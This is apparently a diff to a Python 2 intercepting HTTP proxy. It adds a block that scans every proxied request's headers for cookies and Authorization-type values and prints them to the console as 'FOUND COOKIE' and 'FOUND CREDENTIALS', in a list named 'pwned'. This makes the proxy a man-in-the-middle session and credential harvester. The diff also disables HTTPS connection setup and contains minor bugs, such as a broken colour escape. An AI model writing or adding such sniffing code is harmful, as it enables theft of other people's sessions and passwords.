@@ -17,7 +17,7 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
     lock = threading.Lock()
     def __init__(self, *args, **kwargs):
         self.tls = threading.local()
-        self.tls.con = {}
+        self.tls.socket = {}
         BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
 
     def do_GET(self):
@@ -32,24 +32,35 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
 
         print("HTTP from: {} \033[94m{} {}\033[0m".format(req.client_address[0][7::] ,req.command, req.path))
         
+        #############################""
+        cookie_pattern = [ 'Cookie:', 'cookie:']
+        pwned = ['Authorization:', 'authorization:', 'WWW-Authenticate', 'www-authenticate', 'Proxy-Authorization', 'Proxy-Authenticate']
+        for h in req.headers:
+            for pattern in cookie_pattern:
+                if re.search(pattern,  req.headers[h]):
+                    print("\033[91mFOUND COOKIE: {}033[0m".format(req.headers[h]))
+            for i in pwned:
+                if re.search(i,  req.headers[h]):
+                    print("\033[91mFOUND CREDENTIALS: {}033[0m".format(req.headers[h]))
+        ###############
+        
         url = urlparse.urlsplit(req.path)
         scheme = url.scheme
         netloc = url.netloc
         path = (url.path + '?' + url.query if url.query else url.path)        
-        setattr(req, 'headers', self.clean_headers(req.headers))
+        origin = (scheme, netloc)
 
+        setattr(req, 'headers', self.clean_headers(req.headers))
         try:
-            origin = (scheme, netloc)
-            if  origin is not self.tls.con:
+            if  origin is not self.tls.socket:
                 if scheme == 'https':
-                    self.tls.con = httplib.HTTPSConnection(netloc, timeout=self.timeout)
+                    pass
+                    #self.tls.socket = httplib.HTTPSConnection(netloc, timeout=self.timeout)
                 else:
-                    self.tls.con = httplib.HTTPConnection(netloc, timeout=self.timeout)
-            
-            self.tls.con.request(self.command, path, req_body, dict(req.headers))
-            res = self.tls.con.getresponse()
+                    self.tls.socket = httplib.HTTPConnection(netloc, timeout=self.timeout)
+            self.tls.socket.request(self.command, path, req_body, dict(req.headers))
+            res = self.tls.socket.getresponse()
             setattr(res, 'headers', res.msg)
-            setattr(res, 'response_version', {10: 'HTTP/1.0', 11: 'HTTP/1.1'})
             res_body = res.read()
         except Exception as e:
             print ("Exception ---> {}".format(e))
